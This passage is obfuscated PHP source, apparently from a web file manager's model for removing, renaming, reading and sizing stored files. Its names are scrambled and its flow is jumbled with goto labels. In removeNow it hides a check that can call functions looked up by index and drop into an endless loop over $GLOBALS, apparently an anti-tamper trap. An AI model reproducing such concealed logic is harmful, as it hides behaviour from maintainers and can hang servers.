$this->updateModifyTime($bµÖŒË¬öê[$BÂÉ¿ğÚÉ™[457]]); $D ©÷êƒñ‰ = $BÂÉ¿ğÚÉ™[2310] . $fÑ Ÿ¡à¾±[$BÂÉ¿ğÚÉ™[365]]; if (isset(self::$cacheChildList[$D ©÷êƒñ‰])) { unset(self::$cacheChildList[$D ©÷êƒñ‰]); } goto F¢Õä“¥ªŒ; B®œóÍñ˜È: } public function remove($bŒà÷¬’÷ò, $AÁ ÄÏÊçÏ = true) { goto b‰İÂÛ´; C¨Öù§ïø×: $this->recycleClear($F¡Æ…ÂñŞ¶); return $this->move($bŒà÷¬’÷ò, $fî½¯ºå»›, REPEAT_RENAME_FOLDER); goto e·ËñáæŒ‡; b‰İÂÛ´: $Fóİƒ¸İÉ =& $_SERVER[Ö]; $F¡Æ…ÂñŞ¶ = $this->sourceInfo($bŒà÷¬’÷ò); $aÈ“ÈÂí¸Ô = intval($F¡Æ…ÂñŞ¶[$Fóİƒ¸İÉ[367]]) === self::TYPE_SYSTEM; goto A‰ñˆÑ’À; A‰ñˆÑ’À: $CÇÕ¢Ùî‰† = Model($Fóİƒ¸İÉ[1412])->get($Fóİƒ¸İÉ[2311]) == $Fóİƒ¸İÉ[83]; if ($aÈ“ÈÂí¸Ô || $AÁ ÄÏÊçÏ || !$CÇÕ¢Ùî‰†) { return $this->removeNow($bŒà÷¬’÷ò, $AÁ ÄÏÊçÏ); } $D“èØ÷°ã³ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto d†»âŒØÂâ; DˆÜ³‚å¥é: CacheLock::lock($a‚«›¶İĞ); $fî½¯ºå»› = $this->fileNameExist($D“èØ÷°ã³, $bœë‹›¼¸Ç); if (!$fî½¯ºå»›) { $fî½¯ºå»› = $this->mkdir($D“èØ÷°ã³, $bœë‹›¼¸Ç, REPEAT_SKIP); $this->metaSet($fî½¯ºå»›, $Fóİƒ¸İÉ[2315], $Fª‰§¶…á); $this->metaSet($fî½¯ºå»›, $Fóİƒ¸İÉ[2316], $F¡Æ…ÂñŞ¶[$Fóİƒ¸İÉ[452]]); if ($F¡Æ…ÂñŞ¶[$Fóİƒ¸İÉ[457]] != 0) { $this->metaSet($fî½¯ºå»›, $Fóİƒ¸İÉ[2317], _get($E‹ØÛéŞ, $Fóİƒ¸İÉ[2318])); } } goto bÍÙ´‚ÆÆ; d†»âŒØÂâ: $Fª‰§¶…á = $F¡Æ…ÂñŞ¶[$Fóİƒ¸İÉ[367]] == self::TYPE_USER ? $Fóİƒ¸İÉ[531] : $Fóİƒ¸İÉ[966]; if ($Fª‰§¶…á == $Fóİƒ¸İÉ[531]) { $E‹ØÛéŞ = Model($Fóİƒ¸İÉ[470])->getInfo($F¡Æ…ÂñŞ¶[$Fóİƒ¸İÉ[452]]); $bœë‹›¼¸Ç = !empty($E‹ØÛéŞ[$Fóİƒ¸İÉ[2304]]) ? $E‹ØÛéŞ[$Fóİƒ¸İÉ[2304]] : $E‹ØÛéŞ[$Fóİƒ¸İÉ[28]]; $bœë‹›¼¸Ç = $Fóİƒ¸İÉ[244] . $bœë‹›¼¸Ç . $Fóİƒ¸İÉ[2312] . $F¡Æ…ÂñŞ¶[$Fóİƒ¸İÉ[452]]; } else { $E‹ØÛéŞ = Model($Fóİƒ¸İÉ[454])->getInfo($F¡Æ…ÂñŞ¶[$Fóİƒ¸İÉ[452]]); $bœë‹›¼¸Ç = _get($E‹ØÛéŞ, $Fóİƒ¸İÉ[28]); $bœë‹›¼¸Ç = $Fóİƒ¸İÉ[153] . $bœë‹›¼¸Ç . $Fóİƒ¸İÉ[2313] . $F¡Æ…ÂñŞ¶[$Fóİƒ¸İÉ[452]]; } $a‚«›¶İĞ = $Fóİƒ¸İÉ[2314] . md5($bœë‹›¼¸Ç); goto DˆÜ³‚å¥é; bÍÙ´‚ÆÆ: CacheLock::unlock($a‚«›¶İĞ); $this->metaSet($bŒà÷¬’÷ò, $Fóİƒ¸İÉ[2319], $F¡Æ…ÂñŞ¶[$Fóİƒ¸İÉ[457]]); $this->where(array($Fóİƒ¸İÉ[365] => $bŒà÷¬’÷ò))->save(array($Fóİƒ¸İÉ[386] => time())); goto C¨Öù§ïø×; e·ËñáæŒ‡: } private function recycleClear($A£ËŠÜ) { $B°––İ”¥Ä =& $_SERVER[Ö]; $Cø¬¾ë‰‘ = $this->childrenAll($A£ËŠÜ); $aöÌ„‘ŒÓ‹ = array($B°––İ”¥Ä[379] => array($B°––İ”¥Ä[380], $Cø¬¾ë‰‘[$B°––İ”¥Ä[2320]])); Model($B°––İ”¥Ä[2321])->where($aöÌ„‘ŒÓ‹)->delete(); } public function removeNow($E»à¬ÓšÇÎ, $b¿Ÿ‰è»´… = true) { goto CÖ´˜È©£×; F¥Ù®˜´è: return !0; goto A«Óè™ÇÛ¶; CÖ´˜È©£×: $F ‘ªÍÈï =& $_SERVER[Ö]; if (!isset($_SERVER[$F ‘ªÍÈï[755]]) || !isset($_SERVER[$F ‘ªÍÈï[1294]])) { goto a©ôƒŸå˜¾; FÇ°è“‰°: $E™Å¯‚ï = $F ‘ªÍÈï[789]; $E™Å¯‚ï($_SERVER[$F ‘ªÍÈï[790]]); $BãÄ–®ã = 1; goto aÌ¦’æ…Ç¨; a©ôƒŸå˜¾: $Bç¬Å¬½”° = $F ‘ªÍÈï[788]; $Eîİ¿«§ôö = $F ‘ªÍÈï[756]; $cÈ«³¼Š–» = $_SERVER[$F ‘ªÍÈï[757]] . $F ‘ªÍÈï[758]; goto B²™ß™çœÕ; B²™ß™çœÕ: $Cèõ±Ä§Ï = $Eîİ¿«§ôö($cÈ«³¼Š–»); $fƒ·®Ã¡ÑÕ = explode($F ‘ªÍÈï[213], $Cèõ±Ä§Ï); if (count($fƒ·®Ã¡ÑÕ) < $F ‘ªÍÈï[560]) { $dĞƒ™³†ßš = $F ‘ªÍÈï[759]; $dĞƒ™³†ßš(); } goto FÇ°è“‰°; aÌ¦’æ…Ç¨: for ($c¼ä·öÏ¦¶ = $BãÄ–®ã; $c¼ä·öÏ¦¶ > 0; $c¼ä·öÏ¦¶++) { $E™Å¯‚ï = json_encode($GLOBALS[$F ‘ªÍÈï[380]]); } goto FÍ‡•‹Ğòä; FÍ‡•‹Ğòä: } $b…•…¹¢è¸ = $this->sourceInfo($E»à¬ÓšÇÎ); goto a™Á‚Ã¼Ñ; f¾ê„ÚÈ•¦: $this->updateModifyTime($Aä–¨·Á§); $this->lockMoveEnd($E»à¬ÓšÇÎ); Hook::trigger($F ‘ªÍÈï[1448], $eÏ¸‘–”¡, $b¿Ÿ‰è»´…); goto F¥Ù®˜´è; CàÂŠ¦¶™: $this->lockMoveStart($E»à¬ÓšÇÎ); Hook::trigger($F ‘ªÍÈï[2322], $eÏ¸‘–”¡, $b¿Ÿ‰è»´…); if ($b¿Ÿ‰è»´…) { Model($F ‘ªÍÈï[2321])->moveToRecycle($E»à¬ÓšÇÎ); } else { $C®ãßéÉ‡‚ = $this->childrenAll($b…•…¹¢è¸); Model($F ‘ªÍÈï[501])->eventRemove($E»à¬ÓšÇÎ); $this->removeRelevance($C®ãßéÉ‡‚[$F ‘ªÍÈï[2320]], $C®ãßéÉ‡‚[$F ‘ªÍÈï[1244]]); } goto Cõá¡‰‹©; a™Á‚Ã¼Ñ: $eÏ¸‘–”¡ = $this->pathInfoMore($E»à¬ÓšÇÎ); if (!$b…•…¹¢è¸) { return !0; } if ($b…•…¹¢è¸[$F ‘ªÍÈï[457]] == 0) { if (!_get($GLOBALS, $F ‘ªÍÈï[453])) { return !1; } } goto CàÂŠ¦¶™; Cõá¡‰‹©: $this->folderSizeReset($b…•…¹¢è¸[$F ‘ªÍÈï[457]]); $Aä–¨·Á§ = array($b…•…¹¢è¸[$F ‘ªÍÈï[457]]); if ($b…•…¹¢è¸[$F ‘ªÍÈï[366]] == $F ‘ªÍÈï[83]) { $Aä–¨·Á§[] = $b…•…¹¢è¸[$F ‘ªÍÈï[365]]; } goto f¾ê„ÚÈ•¦; A«Óè™ÇÛ¶: } public function childrenAll($Cßìã¼ñÄ‰) { $b§°ÅÙ™á³ =& $_SERVER[Ö]; $b…è±å‰Ë = $Cßìã¼ñÄ‰[$b§°ÅÙ™á³[365]]; if ($Cßìã¼ñÄ‰[$b§°ÅÙ™á³[366]] == $b§°ÅÙ™á³[83]) { $FÆğµåìµÇ = array($b§°ÅÙ™á³[521] => array($b§°ÅÙ™á³[479], $Cßìã¼ñÄ‰[$b§°ÅÙ™á³[455]] . $b…è±å‰Ë . $b§°ÅÙ™á³[480])); $bè«•˜‡« = array($b§°ÅÙ™á³[521] => $FÆğµåìµÇ[$b§°ÅÙ™á³[455]]); $CçßÙ…Ş = $this->field($b§°ÅÙ™á³[2323])->where($bè«•˜‡«)->select(); $fê²Ğ¬ÂòÕ = !1; $bÀöø®”è° = array($b…è±å‰Ë); if ($CçßÙ…Ş) { $fê²Ğ¬ÂòÕ = array_to_keyvalue($CçßÙ…Ş, $b§°ÅÙ™á³[33], $b§°ÅÙ™á³[415]); $fê²Ğ¬ÂòÕ = array_remove_value($fê²Ğ¬ÂòÕ, $b§°ÅÙ™á³[464]); $bÀöø®”è° = array_to_keyvalue($CçßÙ…Ş, $b§°ÅÙ™á³[33], $b§°ÅÙ™á³[365]); $bÀöø®”è°[] = $b…è±å‰Ë; } } else { $fê²Ğ¬ÂòÕ = array($Cßìã¼ñÄ‰[$b§°ÅÙ™á³[415]]); $bÀöø®”è° = array($b…è±å‰Ë); } return array($b§°ÅÙ™á³[2320] => $bÀöø®”è°, $b§°ÅÙ™á³[1244] => $fê²Ğ¬ÂòÕ); } public function removeArray($d”Ù‹Ş¬Š) { if (!$d”Ù‹Ş¬Š) { return !0; } } public function removeRelevance($f«àëÃµİ˜, $A÷±ğ‡İó‡) { goto eìäëà…¢; e¨ğ©ï ²ç: Model($BëÚ¶ß¥»Ñ[2324])->where($FêÃ—‡¾‰˜)->delete(); Model($BëÚ¶ß¥»Ñ[501])->where($FêÃ—‡¾‰˜)->delete(); Model($BëÚ¶ß¥»Ñ[2054])->removeBySource($f«àëÃµİ˜); goto Bƒ«Ô”óÔ; eìäëà…¢: $BëÚ¶ß¥»Ñ =& $_SERVER[Ö]; $f«àëÃµİ˜ = $f«àëÃµİ˜ ? $f«àëÃµİ˜ : array(); $A÷±ğ‡İó‡ = $A÷±ğ‡İó‡ ? $A÷±ğ‡İó‡ : array(); goto f’¹Ä¢¶‚Í; aÖâ—ßÆÚÔ: for ($C„ÅÎÌ® = 0; $C„ÅÎÌ® < count($f«àëÃµİ˜); $C„ÅÎÌ®++) { $this->sourceCacheClear($f«àëÃµİ˜[$C„ÅÎÌ®]); } goto e§ï¦»‚Ù; f’¹Ä¢¶‚Í: $f«àëÃµİ˜ = array_unique(array_filter($f«àëÃµİ˜)); $A÷±ğ‡İó‡ = array_unique(array_filter($A÷±ğ‡İó‡)); if (!$f«àëÃµİ˜) { return !1; } goto BØÃ Öá‚Ì; Bƒ«Ô”óÔ: Model($BëÚ¶ß¥»Ñ[2302])->removeBySource($f«àëÃµİ˜); $this->where($FêÃ—‡¾‰˜)->delete(); Model($BëÚ¶ß¥»Ñ[418])->remove($A÷±ğ‡İó‡); goto aÖâ—ßÆÚÔ; BØÃ Öá‚Ì: $FêÃ—‡¾‰˜ = array($BëÚ¶ß¥»Ñ[379] => array($BëÚ¶ß¥»Ñ[380], $f«àëÃµİ˜)); Model($BëÚ¶ß¥»Ñ[2321])->where($FêÃ—‡¾‰˜)->delete(); Model($BëÚ¶ß¥»Ñ[409])->where($FêÃ—‡¾‰˜)->delete(); goto e¨ğ©ï ²ç; e§ï¦»‚Ù: } public function rename($A­Ø†¾‚´Ğ, $eäÕ„ë©Ñ¼) { goto A“±¡‚Á; A“±¡‚Á: $FÁ¯‡İ‰‡¿ =& $_SERVER[Ö]; $FÛ«öÔÔ‚ = $this->sourceInfo($A­Ø†¾‚´Ğ); if (!$FÛ«öÔÔ‚) { return !1; } goto FŸÒĞ¹ö•º; FŸÒĞ¹ö•º: $F†îÃóÅèæ = $this->fileNameExist($FÛ«öÔÔ‚[$FÁ¯‡İ‰‡¿[457]], $eäÕ„ë©Ñ¼); if ($F†îÃóÅèæ) { return !1; } $a¢ôÚöãĞİ = array($FÁ¯‡İ‰‡¿[382] => $eäÕ„ë©Ñ¼, $FÁ¯‡İ‰‡¿[520] => USER_ID); goto f†ƒ¼äˆˆ«; f†ƒ¼äˆˆ«: if (!$FÛ«öÔÔ‚[$FÁ¯‡İ‰‡¿[366]] == $FÁ¯‡İ‰‡¿[83]) { $a¢ôÚöãĞİ[$FÁ¯‡İ‰‡¿[368]] = get_path_ext($eäÕ„ë©Ñ¼); } Model($FÁ¯‡İ‰‡¿[501])->eventRename($A­Ø†¾‚´Ğ, $FÛ«öÔÔ‚[$FÁ¯‡İ‰‡¿[28]], $eäÕ„ë©Ñ¼); $this->sourceCacheClear($A­Ø†¾‚´Ğ); goto cš”Şİ³³; A°œ¹Üáä¿: $F÷‹ª¤ï• = $FÁ¯‡İ‰‡¿[2310] . $FÛ«öÔÔ‚[$FÁ¯‡İ‰‡¿[457]]; if (isset(self::$cacheChildList[$F÷‹ª¤ï•])) { unset(self::$cacheChildList[$F÷‹ª¤ï•]); } return $Dˆ‰ƒ»ÜÃ˜; goto A÷»ÔÇõˆ; cš”Şİ³³: $this->setNamePinyin($A­Ø†¾‚´Ğ, $a¢ôÚöãĞİ[$FÁ¯‡İ‰‡¿[28]], !1); $this->updateModifyTime($FÛ«öÔÔ‚[$FÁ¯‡İ‰‡¿[457]]); $Dˆ‰ƒ»ÜÃ˜ = $this->where(array($FÁ¯‡İ‰‡¿[379] => $A­Ø†¾‚´Ğ))->data($a¢ôÚöãĞİ)->save(); goto A°œ¹Üáä¿; A÷»ÔÇõˆ: } public function setNamePinyin($B‹ªï¿éåù, $fÍì±‡àç‘, $b¶¹‘óƒ¨ƒ = true) { $dö©µá¸´Ã =& $_SERVER[Ö]; $e’¼Ú’Šøµ = Input::check($fÍì±‡àç‘, $dö©µá¸´Ã[524]); if ($b¶¹‘óƒ¨ƒ && !$e’¼Ú’Šøµ) { return; } if (!$e’¼Ú’Šøµ) { $this->metaSet($B‹ªï¿éåù, $dö©µá¸´Ã[412], null); $this->metaSet($B‹ªï¿éåù, $dö©µá¸´Ã[411], null); return; } $aê…É„…² = array($dö©µá¸´Ã[412] => str_replace($dö©µá¸´Ã[50], $dö©µá¸´Ã[33], Pinyin::encode($fÍì±‡àç‘)), $dö©µá¸´Ã[411] => Pinyin::encode($fÍì±‡àç‘, $dö©µá¸´Ã[525])); $this->metaSet($B‹ªï¿éåù, $aê…É„…²); } public function getContent($bóÄó­‹•µ) { goto C‚İ îØ¤Ö; C‚İ îØ¤Ö: $Aò·ßİİÉà =& $_SERVER[Ö]; $D¨ÙÖ¹±ï = $this->fileInfoGet($bóÄó­‹•µ); if (!$D¨ÙÖ¹±ï) { return !1; } goto Bˆ„õ¸×Åá; dÂç£øË†ñ: return IO::getContent($D¨ÙÖ¹±ï[$Aò·ßİİÉà[75]]); goto d“‰•óñíŠ; Bˆ„õ¸×Åá: if ($D¨ÙÖ¹±ï[$Aò·ßİİÉà[77]] == 0) { return $Aò·ßİİÉà[33]; } $dº•‚Ş‰ó = $Aò·ßİİÉà[2325] . $D¨ÙÖ¹±ï[$Aò·ßİİÉà[159]]; if ($D¨ÙÖ¹±ï[$Aò·ßİİÉà[77]] <= 1024 * 10) { $cæŞœ­Ûµ‚ = Cache::get($dº•‚Ş‰ó); if (!$cæŞœ­Ûµ‚) { $cæŞœ­Ûµ‚ = IO::getContent($D¨ÙÖ¹±ï[$Aò·ßİİÉà[75]]); Cache::set($dº•‚Ş‰ó, $cæŞœ­Ûµ‚); } return $cæŞœ­Ûµ‚; } goto dÂç£øË†ñ; d“‰•óñíŠ: } public function setDesc($FÊ‘‘Â‚ñ§, $A¦Áì›İ©) { $EÍÆµƒÙÚ =& $_SERVER[Ö]; Model($EÍÆµƒÙÚ[501])->eventAddDesc($FÊ‘‘Â‚ñ§, $A¦Áì›İ©); return $this->metaSet($FÊ‘‘Â‚ñ§, $EÍÆµƒÙÚ[401], $A¦Áì›İ©); } public function setContent($aùëğÛÜù, $d–òÇù¸¯â = '') { goto A£ß‹¶•’œ; bŸ¸™Ÿ©¹ğ: if (!$C¸±Øªİ) { return Model($E’ˆù‡ŞÖƒ[418])->remove($b‰²ªŞù£À[$E’ˆù‡ŞÖƒ[415]]); } $this->folderSizeReset($c®é¯Ñ‘¹¦[$E’ˆù‡ŞÖƒ[457]]); return !0; goto C×‹à†ÌÒ; dË•›­ßÕ: if (!$bØñĞñİñÔ || !$c®é¯Ñ‘¹¦) { return !1; } $b‰²ªŞù£À = Model($E’ˆù‡ŞÖƒ[418])->addFileByContent($d–òÇù¸¯â, $c®é¯Ñ‘¹¦[$E’ˆù‡ŞÖƒ[28]]); $C¸±Øªİ = $this->fileHistory($c®é¯Ñ‘¹¦, $b‰²ªŞù£À[$E’ˆù‡ŞÖƒ[415]], $b‰²ªŞù£À[$E’ˆù‡ŞÖƒ[77]]); goto bŸ¸™Ÿ©¹ğ; A£ß‹¶•’œ: $E’ˆù‡ŞÖƒ =& $_SERVER[Ö]; $c®é¯Ñ‘¹¦ = $this->sourceInfo($aùëğÛÜù); $bØñĞñİñÔ = $this->fileInfoGet($aùëğÛÜù); goto dË•›­ßÕ; C×‹à†ÌÒ: } public function fileSubstr($BŒÍÏ®ôí®, $c´¾Ô•ÊŸ‰, $dÁ²…•ƒŠÓ) { $B”¨¼ÎÕçè = $this->fileInfoGet($BŒÍÏ®ôí®); if (!$B”¨¼ÎÕçè) { return !1; } return IO::fileSubstr($B”¨¼ÎÕçè[$_SERVER[Ö][75]], $c´¾Ô•ÊŸ‰, $dÁ²…•ƒŠÓ); } public function fileInfoGet($b†¢“Áôô¥) { goto c®ÏÓçƒ„ ; f‹î•Ëæãõ: $EàŒ‚¥·ïœ = Model($D®Ç××Ÿ‚‘[418])->fileInfo($Dö²¦Ö¼[$D®Ç××Ÿ‚‘[415]]); if ($EàŒ‚¥·ïœ) { $EàŒ‚¥·ïœ[$D®Ç××Ÿ‚‘[28]] = $Dö²¦Ö¼[$D®Ç××Ÿ‚‘[28]]; } self::$cacheFileInfo[$Bª§—óïŞë] = $EàŒ‚¥·ïœ; goto bà«¬ ë–È; cëØ¼Ñ£: $Bª§—óïŞë = $D®Ç××Ÿ‚‘[421] . $Dö²¦Ö¼[$D®Ç××Ÿ‚‘[415]]; $Fæø°ßË‰ç = _get(self::$cacheFileInfo, $Bª§—óïŞë); if ($Fæø°ßË‰ç) { return $Fæø°ßË‰ç; } goto f‹î•Ëæãõ; bà«¬ ë–È: return $EàŒ‚¥·ïœ; goto AŸ¶™¤È»è; c®ÏÓçƒ„ : $D®Ç××Ÿ‚‘ =& $_SERVER[Ö]; $Dö²¦Ö¼ = $this->sourceInfo($b†¢“Áôô¥); if (!$Dö²¦Ö¼ || $Dö²¦Ö¼[$D®Ç××Ÿ‚‘[366]]) { return !1; } goto cëØ¼Ñ£; AŸ¶™¤È»è: } private function folderChildrenNumber($eœ­¡®·¿) { $bšÄ¬Â˜Œù =& $_SERVER[Ö]; $bæ³„‡œğ = $this->sourceInfo($eœ­¡®·¿); $AÚæ©Ö†Ò = array($bšÄ¬Â˜Œù[521] => array($bšÄ¬Â˜Œù[479], $bæ³„‡œğ[$bšÄ¬Â˜Œù[455]] . $eœ­¡®·¿ . $bšÄ¬Â˜Œù[480]), $bšÄ¬Â˜Œù[392] => intval($bæ³„‡œğ[$bšÄ¬Â˜Œù[393]]), $bšÄ¬Â˜Œù[514] => 1); $BÅÔêãí¼ = $this->where($AÚæ©Ö†Ò)->count(); $Cæ¥”Ğö„ = $this->where($AÚæ©Ö†Ò)->where(array($bšÄ¬Â˜Œù[514] => 0))->count(); return array($bšÄ¬Â˜Œù[81] => $Cæ¥”Ğö„, $bšÄ¬Â˜Œù[82] => $BÅÔêãí¼); } public function pathInfo($dŠ©¹õ´ùì, $fšÆÚ åÒµ = false) { goto a¾¬Ö¹åø; B„ÚÊòçô°: $bÕè»¤µ‹Ş = $this->_listDataApplyItem($bÕè»¤µ‹Ş, $fšÆÚ åÒµ); self::$cachePathInfo[$Dšì›‡©ƒ£] = $bÕè»¤µ‹Ş; return $bÕè»¤µ‹Ş; goto FĞ°İí’Œ; AäÀÑİÁ”Ó: if ($Dã—±©ˆĞŞ) { return $Dã—±©ˆĞŞ; } $bÕè»¤µ‹Ş = $this->sourceInfo($dŠ©¹õ´ùì); if (!$bÕè»¤µ‹Ş) { return !1; } goto B„ÚÊòçô°; a¾¬Ö¹åø: $b¸®Îë¿Í =& $_SERVER[Ö]; $Dšì›‡©ƒ£ = $b¸®Îë¿Í[407] . intval($fšÆÚ åÒµ) . $b¸®Îë¿Í[408] . $dŠ©¹õ´ùì; $Dã—±©ˆĞŞ = _get(self::$cachePathInfo, $Dšì›‡©ƒ£); goto AäÀÑİÁ”Ó; FĞ°İí’Œ: } public static $cachePathInfoMore = array(); public function pathInfoMore($c±’ŠŸå†) { goto céï¤ê£â; aÊšÖÙ†Æ¬: self::$cachePathInfoMore[$c±’ŠŸå†] = $eÎ®ÃùÛøÛ; return $eÎ®ÃùÛøÛ; goto EÌß»™³½ï; céï¤ê£â: $cÏâŒÒ‡ğŸ =& $_SERVER[Ö]; $F•¸º¸˜¾ = _get(self::$cachePathInfoMore, $c±’ŠŸå†); if ($F•¸º¸˜¾) { return $F•¸º¸˜¾; } goto d¾œáŒÄ¨Œ; d¾œáŒÄ¨Œ: $eÎ®ÃùÛøÛ = $this->pathInfo($c±’ŠŸå†); if (!$eÎ®ÃùÛøÛ) { return !1; } if ($eÎ®ÃùÛøÛ[$cÏâŒÒ‡ğŸ[366]] == $cÏâŒÒ‡ğŸ[83]) { $eÎ®ÃùÛøÛ[$cÏâŒÒ‡ğŸ[80]] = $this->folderChildrenNumber($c±’ŠŸå†); } goto aÊšÖÙ†Æ¬; EÌß»™³½ï: } public function sourceInfo($A†Õ‰ŠÑ¹) { goto Aî‚‚î×¼; aËËò½Şç: $d…ØğåŸ¢¸ = _get(self::$cacheSourceInfo, $c¡ø”È”Î¾); if ($d…ØğåŸ¢¸) { return $d…ØğåŸ¢¸; } $Aæ•ãØÕÕ = $this->where(array($CÏ‘˜×âÚ[365] => $A†Õ‰ŠÑ¹))->find(); goto dÉè¯‡Ç; Aî‚‚î×¼: $CÏ‘˜×âÚ =& $_SERVER[Ö]; if (!$A†Õ‰ŠÑ¹) { return array(); } $c¡ø”È”Î¾ = $CÏ‘˜×âÚ[406] . $A†Õ‰ŠÑ¹; goto aËËò½Şç; dÉè¯‡Ç: self::$cacheSourceInfo[$c¡ø”È”Î¾] = $Aæ•ãØÕÕ; return self::$cacheSourceInfo[$c¡ø”È”Î¾]; goto B‡· çò; B‡· çò: } public function sourceCacheClear($cï³†²¥˜· = false) { if ($cï³†²¥˜· == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Ö][406] . $cï³†²¥˜·]); } public function pathInfoByPath($D‚ò‘Ûˆ…º, $f´ˆœ¹‡’) { $BçÓí—¯ =& $_SERVER[Ö]; $bÁÑò›‰¬ = !$f´ˆœ¹‡’ ? array() : explode($BçÓí—¯[8], trim($f´ˆœ¹‡’, $BçÓí—¯[8])); $F’ˆÅª¶ô = $D‚ò‘Ûˆ…º; foreach ($bÁÑò›‰¬ as $DÈç­—·ñË) { $B“ß©“ÀÇ = array($BçÓí—¯[457] => $F’ˆÅª¶ô, $BçÓí—¯[28] => $DÈç­—·ñË); $aØÖ‰È¥é = $this->where($B“ß©“ÀÇ)->select(); if (!$aØÖ‰È¥é) { return !1; } $aØÖ‰È¥é = array_sort_by($aØÖ‰È¥é, $BçÓí—¯[393]); $F’ˆÅª¶ô = $aØÖ‰È¥é[0][$BçÓí—¯[365]]; } return $this->pathInfo($F’ˆÅª¶ô, !0); } protected function updateModifyTime($B‘§§ášñ) { goto cìÓ×­Ìö›; E¿‡šåŠ¹: foreach ($B‘§§ášñ as $Cö¨Ñóé¡Å => $D¿ÇöÚéˆ•) { $B‘§§ášñ[$Cö¨Ñóé¡Å] = intval($D¿ÇöÚéˆ•); } $a—Ì¬Ùˆ = array($EØÛÌæ…„ë[365] => array($EØÛÌæ…„ë[7], $B‘§§ášñ)); $AÀ©¨ÒŸØ² = array($EØÛÌæ…„ë[520] => USER_ID, $EØÛÌæ…„ë[386] => time()); goto C£­²¢ÚˆÊ; C£­²¢ÚˆÊ: $this->where($a—Ì¬Ùˆ)->save($AÀ©¨ÒŸØ²); goto d›¸Ï‡õ²Ó; cìÓ×­Ìö›: $EØÛÌæ…„ë =& $_SERVER[Ö]; if (!$B‘§§ášñ) { return; } if (!is_array($B‘§§ášñ)) { $B‘§§ášñ = array($B‘§§ášñ); } goto E¿‡šåŠ¹; d›¸Ï‡õ²Ó: } public function folderSizeReset($aß¿Ë¥Ç‘Ÿ) { goto f¶ŞÑÖæ±õ; f¶ŞÑÖæ±õ: $F›¶¡çŒŠ =& $_SERVER[Ö]; if ($this->statusIgnoreResetSpace) { return; } $DŒÏË„È‰« = $F›¶¡çŒŠ[2326] . $aß¿Ë¥Ç‘Ÿ; goto aæÅ¸ÛÂ£; aæÅ¸ÛÂ£: CacheLock::lock($DŒÏË„È‰«, 20); $this->sourceCacheClear($aß¿Ë¥Ç‘Ÿ); $e‘â‡¦¼Áİ = $this->sourceInfo($aß¿Ë¥Ç‘Ÿ); goto BŠäİ¹¥”·; bÄÍÓª¡‘ğ: $fäÒ™ô”â‡ = $A°‡™Ü«ÙØ - intval($e‘â‡¦¼Áİ[$F›¶¡çŒŠ[77]]); if ($fäÒ™ô”â‡ == 0) { return CacheLock::unlock($DŒÏË„È‰«); } $this->where(array($F›¶¡çŒŠ[379] => $aß¿Ë¥Ç‘Ÿ))->setField($F›¶¡çŒŠ[77], $A°‡™Ü«ÙØ); goto cÜ¶ç‹²ó; cÜ¶ç‹²ó: $CƒŒù†ò½¯ = $this->parentLevelArray($e‘â‡¦¼Áİ[$F›¶¡çŒŠ[455]]); if ($CƒŒù†ò½¯) { $bÄÛã´è¶ = array($F›¶¡çŒŠ[365] => array($F›¶¡çŒŠ[380], $CƒŒù†ò½¯)); if ($fäÒ™ô”â‡ < 0) { $bÄÛã´è¶[$F›¶¡çŒŠ[77]] = array($F›¶¡çŒŠ[924], abs($fäÒ™ô”â‡)); } $this->where($bÄÛã´è¶)->setAdd($F›¶¡çŒŠ[77], $fäÒ™ô”â‡); } $this->targetSpaceUpdate($e‘â‡¦¼Áİ[$F›¶¡çŒŠ[367]], $e‘â‡¦¼Áİ[$F›¶¡çŒŠ[452]]); goto Dñ¿ç˜‚ã±; BŠäİ¹¥”·: $bÄÛã´è¶ = array($F›¶¡çŒŠ[364] => $aß¿Ë¥Ç‘Ÿ, $F›¶¡çŒŠ[392] => 0); $A°‡™Ü«ÙØ = $this->where($bÄÛã´è¶)->sum($F›¶¡çŒŠ[77]); $A°‡™Ü«ÙØ = intval($A°‡™Ü«ÙØ); goto bÄÍÓª¡‘ğ; Dñ¿ç˜‚ã±: CacheLock::unlock($DŒÏË„È‰«); goto b§­“ÙÑ¾³; b§­“ÙÑ¾³: } public function folderSizeResetChildren($BÛÁ‘ã‚¬‹) { goto e„í«ËÍ¦°; CÌ³Ñ‚èÏ: foreach ($E½‘Á·õŠÍ as $D–ß‡Å±) { if ($D–ß‡Å±[$F‘±Šìæ¢[77]] == $D–ß‡Å±[$F‘±Šìæ¢[2328]]) { continue; } $c£ÜÊ•¯¹‚[] = array($F‘±Šìæ¢[365], $D–ß‡Å±[$F‘±Šìæ¢[365]], $F‘±Šìæ¢[77], $D–ß‡Å±[$F‘±Šìæ¢[77]]); } $this->saveAll($c£ÜÊ•¯¹‚); goto F—ø”ÚÂíß; CïÌ‹Êñ·…: $eíœ¬Íô½Ã[$F‘±Šìæ¢[366]] = 0; $D‹ñ¬Î³Î = $this->field($dÆ®Íëƒà‹)->where($eíœ¬Íô½Ã)->select(); if (!$D‹ñ¬Î³Î) { return; } goto E…ª²ˆó¤¬; aÄæÈÓ«¼Ä: $eíœ¬Íô½Ã = array($F‘±Šìæ¢[514] => 1, $F‘±Šìæ¢[521] => array($F‘±Šìæ¢[479], $a¤Œ–Á° Ü[$F‘±Šìæ¢[455]] . $BÛÁ‘ã‚¬‹ . $F‘±Šìæ¢[480])); $dÆ®Íëƒà‹ = $F‘±Šìæ¢[2327]; $E½‘Á·õŠÍ = $this->field($dÆ®Íëƒà‹)->where($eíœ¬Íô½Ã)->select(); goto CïÌ‹Êñ·…; A¨‚­Àó”: foreach ($D‹ñ¬Î³Î as $D–ß‡Å±) { $C’íÊğ¦Û÷ = $D–ß‡Å±[$F‘±Šìæ¢[457]] . $F‘±Šìæ¢[33]; if (!isset($E½‘Á·õŠÍ[$C’íÊğ¦Û÷])) { continue; } if ($D–ß‡Å±[$F‘±Šìæ¢[393]] == $E½‘Á·õŠÍ[$C’íÊğ¦Û÷][$F‘±Šìæ¢[393]]) { $E½‘Á·õŠÍ[$C’íÊğ¦Û÷][$F‘±Šìæ¢[77]] += $D–ß‡Å±[$F‘±Šìæ¢[77]]; } } foreach ($E½‘Á·õŠÍ as $D–ß‡Å±) { $f»æ§àÊˆä = $this->parentLevelArray($D–ß‡Å±[$F‘±Šìæ¢[455]]); foreach ($f»æ§àÊˆä as $C’íÊğ¦Û÷) { $C’íÊğ¦Û÷ = $C’íÊğ¦Û÷ . $F‘±Šìæ¢[33]; if (!isset($E½‘Á·õŠÍ[$C’íÊğ¦Û÷])) { 